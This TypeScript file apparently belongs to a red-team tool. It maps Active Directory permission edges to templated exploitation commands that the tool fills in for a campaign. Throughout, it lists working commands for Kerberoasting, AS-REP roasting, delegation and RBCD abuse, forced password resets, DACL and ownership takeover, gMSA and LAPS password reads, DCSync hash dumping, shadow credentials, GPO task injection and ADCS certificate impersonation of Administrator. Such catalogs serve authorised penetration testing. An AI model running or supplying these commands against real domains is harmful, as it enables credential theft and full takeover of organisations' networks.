// Exploitation command catalog for the pre-built queries, distilled from
// Pughound's graph report (BloodHound-style abuse info). Template variables are
// resolved against the campaign at render time: {{domain}} {{dc}} {{target}}
// {{source}} {{targetDN}} {{user}} {{password}} — user/password stay literal
// placeholders for the operator to fill.

export interface AbuseCommand {
  title: string;
  tool?: string;
  description?: string;
  command?: string;
}

/** Keyed by the Pughound abuse name; queries reference these keys. */
export const ABUSE_COMMANDS: Record<string, AbuseCommand[]> = {
  "HasSPN": [
    {
      "title": "Kerberoast: request the SPN ticket",
      "tool": "impacket",
      "description": "Any domain user can request the service ticket and crack the password offline.",
      "command": "impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc}} -request-user {{source}}"
    },
    {
      "title": "Kerberoast via Rubeus (Windows)",
      "tool": "Rubeus",
      "description": "Equivalent in a Windows environment with Hashcat-format hash.",
      "command": "Rubeus.exe kerberoast /user:{{source}} /nowrap"
    }
  ],
  "ASREPRoast": [
    {
      "title": "ASREPRoast (no credentials)",
      "tool": "impacket",
      "description": "Account with DONT_REQ_PREAUTH: request the AS-REP and crack it offline.",
      "command": "impacket-GetNPUsers {{domain}}/{{target}} -no-pass -dc-ip {{dc}} -format hashcat"
    },
    {
      "title": "ASREPRoast via Rubeus (Windows)",
      "tool": "Rubeus",
      "description": "Equivalent in a Windows environment.",
      "command": "Rubeus.exe asreproast /user:{{target}} /nowrap"
    }
  ],
  "AllowedToDelegate": [
    {
      "title": "S4U2Proxy to the target service",
      "tool": "impacket",
      "description": "The source account has constrained delegation to the target's service; impersonate an administrator.",
      "command": "impacket-getST -spn 'cifs/{{target}}' -impersonate Administrator -dc-ip {{dc}} '{{domain}}/{{source}}:{{password}}'"
    },
    {
      "title": "S4U via Rubeus (Windows)",
      "tool": "Rubeus",
      "description": "Runs S4U2Self+S4U2Proxy and injects the ticket (pass-the-ticket).",
      "command": "Rubeus.exe s4u /user:{{source}} /password:{{password}} /impersonateuser:Administrator /msdsspn:cifs/{{target}} /ptt"
    }
  ],
  "TrustedToAuth": [
    {
      "title": "Unconstrained delegation: monitor TGTs",
      "tool": "Rubeus",
      "description": "With the computer compromised, capture TGTs of whoever authenticates to it.",
      "command": "Rubeus.exe monitor /interval:5 /targetuser:DC01$"
    },
    {
      "title": "Authentication coercion to the host",
      "tool": "impacket",
      "description": "Force a DC to authenticate to the unconstrained delegation host (printer bug) to capture its TGT.",
      "command": "impacket-printerbug {{domain}}/{{user}}:'{{password}}'@{{dc}} {{source}}"
    }
  ],
  "AllowedToAct": [
    {
      "title": "Configure RBCD via a controlled computer",
      "tool": "impacket",
      "description": "With AllowedToAct (or control of an object with msDS-AllowedToActOnBehalfOfOtherIdentity), delegate from a machine you control and run S4U2Self+S4U2Proxy.",
      "command": "impacket-rbcd -delegate-from 'EVILCOMPUTER$' -delegate-to {{target}} -action write -dc-ip {{dc}} '{{domain}}/{{user}}:{{password}}'"
    },
    {
      "title": "Get a service ticket impersonating admin",
      "tool": "impacket",
      "description": "After RBCD, request a cifs ticket to the target impersonating an administrator.",
      "command": "impacket-getST -spn 'cifs/{{target}}' -impersonate Administrator -dc-ip {{dc}} '{{domain}}/EVILCOMPUTER$:{{password}}'"
    }
  ],
  "GenericAll": [
    {
      "title": "Full control: reset password (user target)",
      "tool": "bloodyAD",
      "description": "GenericAll over a user allows a direct password reset.",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' set password {{target}} 'NewPass123!'"
    },
    {
      "title": "Full control: add yourself to the group (group target)",
      "tool": "bloodyAD",
      "description": "GenericAll over a group allows adding yourself as a member.",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' add groupMember {{target}} {{user}}"
    },
    {
      "title": "Targeted Kerberoast (user target)",
      "tool": "impacket",
      "description": "GenericAll allows writing an SPN on the target and requesting the RC4 ticket for offline cracking.",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' set object {{target}} servicePrincipalName -v 'fake/{{target}}' && impacket-GetUserSPNs {{domain}}/{{user}}:'{{password}}' -dc-ip {{dc}} -request-user {{target}}"
    }
  ],
  "WriteDacl": [
    {
      "title": "Grant yourself GenericAll on the target",
      "tool": "bloodyAD",
      "description": "WriteDacl allows editing the object's DACL; grant full control and exploit as GenericAll.",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' add genericAll {{targetDN}} {{user}}"
    },
    {
      "title": "Edit the DACL with dacledit",
      "tool": "impacket",
      "description": "Impacket alternative to grant FullControl.",
      "command": "impacket-dacledit -action write -rights FullControl -principal {{user}} -target-dn '{{targetDN}}' -dc-ip {{dc}} '{{domain}}/{{user}}:{{password}}'"
    }
  ],
  "WriteOwner": [
    {
      "title": "Take ownership of the target",
      "tool": "bloodyAD",
      "description": "WriteOwner allows setting yourself as owner; then edit the DACL (see WriteDacl).",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' set owner {{targetDN}} {{user}}"
    },
    {
      "title": "Take ownership with owneredit",
      "tool": "impacket",
      "description": "An owner implicitly has WriteDacl; chain with dacledit for FullControl.",
      "command": "impacket-owneredit -action write -new-owner {{user}} -target-dn '{{targetDN}}' -dc-ip {{dc}} '{{domain}}/{{user}}:{{password}}'"
    }
  ],
  "GenericWrite": [
    {
      "title": "Write an arbitrary attribute on the target",
      "tool": "bloodyAD",
      "description": "GenericWrite allows modifying attributes (e.g. servicePrincipalName for targeted kerberoast).",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' set object {{target}} servicePrincipalName -v 'fake/{{target}}'"
    },
    {
      "title": "Modify the object via PowerView",
      "tool": "PowerView",
      "description": "Equivalent in a Windows environment.",
      "command": "Set-DomainObject -Identity {{target}} -Set @{'servicePrincipalName'='fake/{{target}}'}"
    }
  ],
  "ForceChangePassword": [
    {
      "title": "Reset the target's password",
      "tool": "bloodyAD",
      "description": "Abuses the User-Force-Change-Password extended right to set a new password without knowing the current one.",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' set password {{target}} 'NewPass123!'"
    },
    {
      "title": "Reset the target's password (netexec)",
      "tool": "netexec",
      "description": "Same primitive over SMB/RPC.",
      "command": "netexec smb {{dc}} -u {{user}} -p '{{password}}' -M change_password -o USER={{target}} NEWPASS='NewPass123!'"
    }
  ],
  "Owns": [
    {
      "title": "Owner -> WriteDacl -> GenericAll",
      "tool": "impacket",
      "description": "The owner can edit the DACL. Grant FullControl to yourself and exploit as GenericAll.",
      "command": "impacket-dacledit -action write -rights FullControl -principal {{user}} -target-dn '{{targetDN}}' -dc-ip {{dc}} '{{domain}}/{{user}}:{{password}}'"
    },
    {
      "title": "Take ownership of the target",
      "tool": "bloodyAD",
      "description": "If you have WriteOwner (or are an admin), become the object's owner; the owner can always edit the DACL.",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' set owner {{target}} {{user}}"
    },
    {
      "title": "Set owner via owneredit.py",
      "tool": "impacket",
      "description": "bloodyAD alternative: writes your SID as the target object's owner.",
      "command": "owneredit.py -action write -new-owner '{{user}}' -target '{{target}}' -dc-ip {{dc}} '{{domain}}/{{user}}:{{password}}'"
    },
    {
      "title": "Grant rights via dacledit (post-owner)",
      "tool": "impacket",
      "description": "As owner, edit the DACL: grant FullControl (GenericAll) to your user and follow the GenericAll commands.",
      "command": "impacket-dacledit -action write -rights FullControl -principal {{user}} -target-dn '{{targetDN}}' -dc-ip {{dc}} '{{domain}}/{{user}}:{{password}}'"
    }
  ],
  "ReadGMSAPassword": [
    {
      "title": "Read the gMSA password",
      "tool": "netexec",
      "description": "Reads msDS-ManagedPassword from readable gMSA accounts and decodes the blob.",
      "command": "netexec ldap {{dc}} -u {{user}} -p '{{password}}' --gmsa"
    },
    {
      "title": "Read the gMSA managed attribute",
      "tool": "bloodyAD",
      "description": "Direct read of the msDS-ManagedPassword attribute.",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' get object {{target}} --attr msDS-ManagedPassword"
    }
  ],
  "ReadLAPSPassword": [
    {
      "title": "Read the computer's LAPS password",
      "tool": "netexec",
      "description": "Reads ms-Mcs-AdmPwd from all readable computers.",
      "command": "netexec ldap {{dc}} -u {{user}} -p '{{password}}' -M laps"
    },
    {
      "title": "Read LAPS via PowerView",
      "tool": "PowerView",
      "description": "Direct read of the attribute on the computer object.",
      "command": "Get-DomainComputer {{target}} -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"
    }
  ],
  "GetChanges": [
    {
      "title": "DCSync (partial Get-Changes)",
      "tool": "impacket",
      "description": "DS-Replication-Get-Changes allows replicating secrets; combine with GetChangesAll for full coverage.",
      "command": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc}}'"
    }
  ],
  "GetChangesAll": [
    {
      "title": "Full DCSync",
      "tool": "impacket",
      "description": "DS-Replication-Get-Changes-All: dump all domain hashes.",
      "command": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc}}'"
    },
    {
      "title": "DCSync via netexec",
      "tool": "netexec",
      "description": "SMB alternative with --ntds.",
      "command": "netexec smb {{dc}} -u {{user}} -p '{{password}}' --ntds"
    }
  ],
  "HasSIDHistory": [
    {
      "title": "Abuse SIDHistory",
      "tool": "impacket",
      "description": "The historical SID grants the rights of the original principal; authenticate as the account and access the trusted domain's resources.",
      "command": "impacket-getST -spn 'cifs/{{target}}' -dc-ip {{dc}} '{{domain}}/{{source}}:{{password}}'"
    },
    {
      "title": "Inspect the sIDHistory",
      "tool": "PowerView",
      "description": "Confirm the injected SID and the matching principal.",
      "command": "Get-DomainUser {{source}} -Properties sidhistory"
    }
  ],
  "AddKeyCredentialLink": [
    {
      "title": "Shadow Credentials (pyWhisker)",
      "tool": "pyWhisker",
      "description": "Write a key to the target's msDS-KeyCredentialLink and authenticate via PKINIT.",
      "command": "python3 pywhisker.py -d {{domain}} -u {{user}} -p '{{password}}' --target {{target}} --action add --dc-ip {{dc}}"
    },
    {
      "title": "Shadow Credentials (Whisker, Windows)",
      "tool": "Whisker",
      "description": "Equivalent in a Windows environment; then use Rubeus asktgt with the generated certificate.",
      "command": "Whisker.exe add /target:{{target}} /domain:{{domain}} /dc:{{dc}}"
    }
  ],
  "WriteSPN": [
    {
      "title": "Targeted Kerberoast",
      "tool": "bloodyAD",
      "description": "Plant a fake SPN on the target, request the RC4 ticket and crack it offline. Remove the SPN afterwards.",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' set object {{target}} servicePrincipalName -v 'fake/{{target}}'"
    },
    {
      "title": "Request the planted SPN ticket",
      "tool": "impacket",
      "description": "After planting the SPN, request the ticket for cracking.",
      "command": "impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc}} -request-user {{target}}"
    }
  ],
  "AddMember": [
    {
      "title": "Add a controlled account to the group",
      "tool": "bloodyAD",
      "description": "WriteProperty on the member attribute allows inserting a member into the target group.",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' add groupMember {{target}} {{user}}"
    },
    {
      "title": "Add a member via PowerView",
      "tool": "PowerView",
      "description": "Equivalent in a Windows environment.",
      "command": "Add-DomainGroupMember -Identity '{{target}}' -Members {{user}}"
    }
  ],
  "AddSelf": [
    {
      "title": "Add yourself to the group",
      "tool": "bloodyAD",
      "description": "Validated write Self-Membership allows inserting your own account into the group.",
      "command": "bloodyAD --host {{dc}} -d {{domain}} -u {{user}} -p '{{password}}' add groupMember {{target}} {{user}}"
    }
  ],
  "MemberOf": [
    {
      "title": "Enumerate group members",
      "tool": "PowerView",
      "description": "Membership is informative; enumerate the group to plan the next step.",
      "command": "Get-DomainGroupMember -Identity '{{target}}' -Recurse"
    }
  ],
  "GPLink": [
    {
      "title": "Abuse the linked GPO",
      "tool": "SharpGPOAbuse",
      "description": "With write access to the GPO, inject an immediate scheduled task on the computers affected by the link.",
      "command": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author '{{domain}}\\\\{{user}}' --Command 'cmd.exe' --Arguments '/c whoami > C:\\\\pwn.txt' --GPOName '{{source}}'"
    },
    {
      "title": "Enumerate objects affected by the GPO",
      "tool": "PowerView",
      "description": "List OUs/computers under the link target before modifying the GPO.",
      "command": "Get-DomainOU -Identity '{{target}}' | Get-DomainComputer"
    }
  ],
  "Enroll": [
    {
      "title": "Request a certificate (ESC1: arbitrary SAN)",
      "tool": "certipy",
      "description": "Template with EnrolleeSuppliesSubject + client auth: request a certificate as Domain Admin and authenticate with it.",
      "command": "certipy req -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{dc}} -ca <CA-NAME> -template {{target}} -upn administrator@{{domain}}"
    },
    {
      "title": "Authenticate with the certificate",
      "tool": "certipy",
      "description": "Uses the issued .pfx to recover the requested account's NT hash via PKINIT.",
      "command": "certipy auth -pfx administrator.pfx -dc-ip {{dc}}"
    }
  ],
  "AutoEnroll": [
    {
      "title": "Request a certificate (auto-enrollment)",
      "tool": "certipy",
      "description": "Template with auto-enrollment right: same request; the flow does not depend on manual approval.",
      "command": "certipy req -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{dc}} -ca <CA-NAME> -template {{target}} -upn administrator@{{domain}}"
    }
  ]
};
